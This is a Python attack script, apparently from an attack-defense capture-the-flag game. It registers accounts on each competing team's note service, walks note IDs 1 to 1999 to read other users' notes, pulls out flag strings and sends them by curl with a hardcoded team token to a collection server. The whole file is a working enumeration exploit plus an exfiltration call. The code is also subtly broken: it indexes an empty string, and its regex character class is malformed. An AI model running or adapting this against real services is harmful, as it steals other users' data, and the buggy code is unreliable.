import requests
from random import randint as ri
import re
import subprocess


ips = []
for i in range(1, 12):
    if i == 4: continue
    ips.append('172.25.' + str(i) + ".2")


for ip in ips:
    s = requests.Session()
    site = "http://" + ip + ":8080"
    
    log = ri(1, 10000)
    passw = ri(1, 10000)
    s.post(site + "/registration", data={"login": log, "password": passw})
    
    s.post(site + "/auth", data={"login": log, "password": passw})
    
    print(site)
    
    for el in range(1, 2000):
        try:
            r = s.get(site + "/notes/" + str(el)).text
            
            r = r.split("\n")
          
            for i in range(len(r)):
                resp = ""
                print(resp[i])
                if re.findall("Note #[1-1000000000]", r[i]): 
                    resp = r[i + 2]
            if "The flag is" in resp and "=" in resp:
                flag = resp.split()[-1]
                subprocess.getoutput(f"curl -s -H 'X-Team-Token: 1f48114f9125ed27' -X PUT -d '[\"{flag}\"]' http://172.24.0.1/flags")
                print(flag, site)
        except Exception as e: print(e); exit()
        
        
    
